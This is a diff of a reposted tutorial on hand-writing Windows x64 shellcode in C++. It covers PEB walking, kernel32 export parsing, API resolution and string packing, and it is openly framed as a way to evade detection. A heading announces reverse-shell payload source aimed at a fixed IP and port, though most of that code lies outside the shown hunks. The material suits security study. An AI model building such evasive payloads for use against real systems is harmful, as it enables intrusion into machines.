@@ -1,53 +1,38 @@
 # :skull: Craft Your Own Windows x86/64 Shellcode
 
-> **Original Source:** [Craft Your Own Windows x86/64 Shellcode](https://infosecwriteups.com/craft-your-own-windows-x86-64-shellcode-31b321d1933c)
-> **Platform:** infosecwriteups.com | **Category:** `PWN`
-
 ---
 
 # Craft Your Own Windows x86/64 Shellcode
 
-
 *Photo by [Markus Spiske](https://unsplash.com/@markusspiske?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)*
-
 
 Imagine trying to sneak past high-tech security systems using tools everyone recognizes. That’s the problem with popular frameworks like Metasploit’s msfvenom — their digital fingerprints are well-known. By creating custom shellcode in C++, we can create unique patterns that slip under the radar while gaining fine-grained control over our payload’s behavior.
 
 ## Windows Memory Fundamentals: The Process Diary
 
-
 ### What is PEB (Process Environment Block)?
-
 
 PEB is a special structure in memory that stores important information about a running process (like its modules, settings, etc.). It is part of the EPROCESS structure, which is mostly hidden in kernel mode, but PEB can be accessed from user mode (meaning normal programs can use it).
 
 ### What is TEB (Thread Environment Block)?
 
-
 Every running thread in a program has its own TEB (also called TIB — Thread Information Block). TEB contains details about that thread, including a way to find the PEB.
 
 ### How Do We Find the PEB?
 
-
 Windows stores TEB in a special memory area called FS (for 32-bit) or GS (for 64-bit).
-
 
 There is an offset (0x60 in GS for 64-bit) that points to the PEB address.
 
-
 We use a function __readgsqword(0x60) to get the PEB address.
-
 
 ```
 PPEB peb = (PPEB)__readgsqword(0x60);
 ```
 
-
 ## Retrieving the Loader Data Table (LDR) content
 
-
 The PEB (Process Environment Block) contains a structure called PEB_LDR_DATA, which stores information about all loaded DLLs (modules) in a process.
-
 
 ```
 typedef struct _PEB_LDR_DATA
@@ -61,7 +46,6 @@ LIST_ENTRY InInitializationOrderModuleList;
 PVOID EntryInProgress;
 } PEB_LDR_DATA, *PPEB_LDR_DATA;
 
-
 typedef struct _LIST_ENTRY
 {
 PLIST_ENTRY Flink;
@@ -69,9 +53,7 @@ PLIST_ENTRY Blink;
 } LIST_ENTRY, *PLIST_ENTRY;
 ```
 
-
 ### Step 1: Finding PEB_LDR_DATA
-
 
 - Inside PEB, there is a pointer to PEB_LDR_DATA, which holds details about loaded modules.
 
@@ -79,13 +61,11 @@ PLIST_ENTRY Blink;
 
 ### Step 2: Understanding LIST_ENTRY
 
-
 - `LIST_ENTRY` is a doubly linked list (meaning each item points to the next and previous item).
 
 - This list helps us walk through all loaded DLLs in order.
 
 ### Step 3: What Modules Are Loaded?
-
 
 - The first DLL is the process itself.
 
@@ -93,14 +73,11 @@ PLIST_ENTRY Blink;
 
 - The third is kernel32.dll (provides Windows API functions).
 
-
 ## Traversing the `InMemoryOrderModuleList` to Print Loaded DLLs
-
 
 We can walk through the linked list inside `InMemoryOrderModuleList` to find and print all loaded DLLs in a process.
 
 ## How It Works:
-
 
 - Find the PEB using `__readgsqword(0x60)`.
 
@@ -112,17 +89,13 @@ We can walk through the linked list inside `InMemoryOrderModuleList` to find and
 
 - Stop when we reach the first node again (to avoid infinite looping).
 
-
 We need two key functions from Kernel32.dll:
 
-
 [GetProcAddress](https://learn.microsoft.com/fr-fr/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) to find procedure addresses and [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) to load modules. These functions are sufficient to build our payload.
-
 
 This is where the LDR structure comes into play. It will allow us to find the address of Kernel32.dll and exploit its internal structures as a PE (Portable Executable) format object.
 
 ### DEMO CODE-
-
 
 ```
 #include <windows.h>
@@ -168,23 +141,17 @@ return 0;
 }
 ```
 
-
 ## Parsing the Kernel32 PE object
 
-
 Windows programs use DLL files to perform tasks like reading files, creating windows, or using the internet.
-
 
 One of the most important DLLs is Kernel32.dll, which contains many useful functions.
 
 ### Step-by-Step Breakdown
 
-
 ### Step 1: Find Kernel32.dll in Memory
 
-
 Windows loads DLLs in a list inside the PEB (Process Environment Block).
-
 
 - The 1st item in the list = the program itself.
 
@@ -192,9 +159,7 @@ Windows loads DLLs in a list inside the PEB (Process Environment Block).
 
 - The 3rd item = kernel32.dll (where we want to go).
 
-
 To get Kernel32.dll’s entry, we move three steps in the list:
-
 
 ```
 PLDR_DATA_TABLE_ENTRY kernel32Entry = CONTAINING_RECORD(
@@ -204,36 +169,27 @@ InMemoryOrderLinks
 );
 ```
 
-
 This gives us a pointer to Kernel32.dll in memory.
 
 ### Step 2: Get the Start Address of Kernel32.dll
 
-
 Every DLL has a starting memory address (DllBase).
 
-
 We store this address in a variable:
-
 
 ```
 PIMAGE_DOS_HEADER kernel32DosHeader = (PIMAGE_DOS_HEADER)kernel32Entry->DllBase;
 ```
 
-
 This is like finding the first page of a book before reading its contents.
 
 ### Step 3: Locate the Important Headers
 
-
 Windows programs follow a Portable Executable (PE) format.
-
 
 The real structure of the program starts at an offset called `e_lfanew`.
 
-
 We move to that location:
-
 
 ```
 PIMAGE_NT_HEADERS64 kernel32NtHeader = (PIMAGE_NT_HEADERS64)(
@@ -241,17 +197,13 @@ PIMAGE_NT_HEADERS64 kernel32NtHeader = (PIMAGE_NT_HEADERS64)(
 );
 ```
 
-
 This is like skipping past the cover of a book to its table of contents.
 
 ### Step 4: Find the List of Functions Inside Kernel32.dll
 
-
 The Export Table in Kernel32.dll contains all function names & their locations.
 
-
 We get its address like this:
-
 
 ```
 PIMAGE_EXPORT_DIRECTORY kernel32ExportsTable = (PIMAGE_EXPORT_DIRECTORY)(
@@ -260,21 +212,17 @@ kernel32NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Vir
 );
 ```
 
-
 This is like opening the index page of a book to see where each chapter (function) is located.
 
 ### Step 5: Get the Function Names & Addresses
 
-
 We now extract the actual function names and their memory locations:
-
 
 ```
 DWORD* kernel32addressOfFunctions = (DWORD*)((BYTE*)kernel32DosHeader + kernel32ExportsTable->AddressOfFunctions);
 DWORD* kernel32addressOfNames = (DWORD*)((BYTE*)kernel32DosHeader + kernel32ExportsTable->AddressOfNames);
 WORD* kernel32addressOfNameOrdinals = (WORD*)((BYTE*)kernel32DosHeader + kernel32ExportsTable->AddressOfNameOrdinals);
 ```
-
 
 - `AddressOfFunctions` → List of function memory addresses
 
@@ -283,7 +231,6 @@ WORD* kernel32addressOfNameOrdinals = (WORD*)((BYTE*)kernel32DosHeader + kernel3
 - `AddressOfNameOrdinals` → Links function names to their addresses
 
 ### DEMO CODE-
-
 
 ```
 #include <windows.h>
@@ -351,32 +298,23 @@ return 0;
 }
 ```
 
-
 ## Finding GetProcAddress and Storing Strings in Shellcode
-
 
 ### Why Do We Need GetProcAddress?
 
-
 Windows normally loads functions using GetProcAddress(), but we are finding it manually inside Kernel32.dll.
-
 
 ## Get Itz.sanskarr’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
-
 
 Once we get GetProcAddress(), we can use it to find any function we need, like LoadLibraryA(), which helps us load extra DLLs.
 
 ### Problem: Storing Strings Inside Shellcode
 
-
 When we convert our program to shellcode, everything must be self-contained in the .text section.
-
 
 - We can’t use normal string variables (char*) because they might end up in a different section of memory.
 
@@ -384,29 +322,23 @@ When we convert our program to shellcode, everything must be self-contained in t
 
 ### Storing Function Names as Hexadecimal Numbers
 
-
 We store function names in 8-byte (64-bit) chunks as uint64_t values.
 
 ### Example: Storing “GetProcA”
-
 
 - ASCII representation:G e t P r o c A47 65 74 50 72 6F 63 41 (Hex values)
 
 - Stored as a number:(Reversed because of little-endian format)
 
-
 ```
 uint64_t GetProcA = 0x41636F7250746547;
 ```
 
-
 ### ​Example: Storing “User32.dll”
-
 
 - ASCII representation:U s e r 3 2 . d l l75 73 65 72 33 32 2E 64 6C 6C
 
 - Stored in two 64-bit values:The last part is padded with 0x00 to fit 8 bytes.
-
 
 ```
 
@@ -417,12 +349,9 @@ uint64_t t0, t1;
 text.t0 = 0x642E323372657375; // "User32.d"
 text.t1 = 0x0000000000006C6C; // "ll"
 
-
 ```
 
-
 ### DEMO CODE-
-
 
 ```
 #include <windows.h>
@@ -513,20 +442,15 @@ return 0;
 }
 ```
 
-
 ## Let’s step up our game
-
 
 Now, we want to find the address of `GetProcAddress` so that we can use it to find other important functions like `LoadLibraryA`.
 
 ### Step 1: What is `GetProcAddress`?
 
-
 `GetProcAddress` is a function in Windows that helps us find the memory address of other functions inside a DLL.
 
-
 Here’s how it’s defined in Windows:
-
 
 ```
 
@@ -535,12 +459,9 @@ FARPROC GetProcAddress(
 [in] LPCSTR lpProcName // Name of the function we want to find
 );
 
-
 ```
 
-
 What it does:
-
 
 - We give it a DLL handle (`hModule`) and a function name (`lpProcName`).
 
@@ -548,21 +469,16 @@ What it does:
 
 ### Step 2: Creating a Function Pointer for GetProcAddress
 
-
 Since we don’t know GetProcAddress’s location yet, we need to define a function pointer so we can store its address later:
-
 
 ```
 
 typedef FARPROC (*_GetProcAddress)(HMODULE, LPCSTR);
 _GetProcAddress GetProcAddress = nullptr; // Pointer to store the function address
 
-
 ```
 
-
 Why do we need this?
-
 
 - `_GetProcAddress` is just a custom type for a function pointer that matches `GetProcAddress`'s signature.
 
@@ -570,11 +486,9 @@ Why do we need this?
 
 ### Step 3: Searching for `GetProcAddress` in Kernel32.dll
 
-
 - We loop through Kernel32.dll’s export table to find a function whose name starts with `"GetProcA"`.
 
 - This tells us where `GetProcAddress` is in memory.
-
 
 ```
 
@@ -588,12 +502,9 @@ GetProcAddress = (_GetProcAddress)(const void*)((size_t)kernel32DosHeader + kern
 }
 }
 
-
 ```
 
-
 What’s happening here?
-
 
 - We loop through all exported functions in Kernel32.dll.
 
@@ -603,21 +514,16 @@ What’s happening here?
 
 ### Step 4: Using `GetProcAddress` to Find Other Functions
 
-
 Now that we have `GetProcAddress`, we can use it to find the address of `LoadLibraryA`:
-
 
 ```
 
 HMODULE hKernel32 = (HMODULE)kernel32DosHeader;
 _LoadLibraryA LoadLibraryA = (_LoadLibraryA)GetProcAddress(hKernel32, "LoadLibraryA");
 
-
 ```
 
-
 Why is `LoadLibraryA` important?
-
 
 - `LoadLibraryA` lets us load more DLLs into memory, such as:
 
@@ -626,7 +532,6 @@ Why is `LoadLibraryA` important?
 - `Ws2_32.dll` (for networking, used in reverse shells)
 
 ### DEMO CODE-
-
 
 ```
 #include <windows.h>
@@ -694,9 +599,7 @@ return 0;
 }
 ```
 
-
 ## Here is the full source code of the malicious payload that establish a reverse shell to 192.168.210.130 on TCP port 2106 on a powershell handle
-
 
 ```
 #include <WinSock2.h>
@@ -921,27 +824,19 @@ return 0;
 }
 ```
 
-
 ## Payload conversion to shellcode
-
 
 First, make sure that we are in release mode and choose the build target (x64 or x32).
 
-
 Do not be in Debug mode, as Visual Studio may add certain symbols and background instructions that will alter the uniformity of the assembly code and its independence.
-
 
 Next, ensure that you disable the /GS option in the compilation settings. This option adds security cookies to the binary code, which could also affect the independence of the shellcode.
 
-
 Then, set a breakpoint on the function that contains your payload. In my case, it is named customshellcode().
-
 
 Then launch the program with the Visual Studio local debugger. The program execution will stop at the breakpoint you have set. Now, press Ctrl+Alt+D to open the disassembly view of your code.
 
-
 ## POC-
-
 
 ```
 #include <Windows.h>
@@ -1037,9 +932,7 @@ return 0;
 }
 ```
 
-
 ## Key Takeaways
-
 
 - Custom Shellcode: Writing custom shellcode in C++ allows for greater flexibility and evasion capabilities compared to using well-known tools like msfvenom or Sliver.
 
@@ -1051,10 +944,6 @@ return 0;
 
 ## Final Thoughts
 
-
 This guide provides a comprehensive overview of crafting custom shellcode, from understanding Windows internals to executing payloads stealthily. While these techniques are powerful, they should only be used in ethical and authorized scenarios. By mastering these concepts, you can better defend against sophisticated attacks and contribute to the cybersecurity community.
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/craft-your-own-windows-x86-64-shellcode-31b321d1933c). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of pwn CTF writeups.*
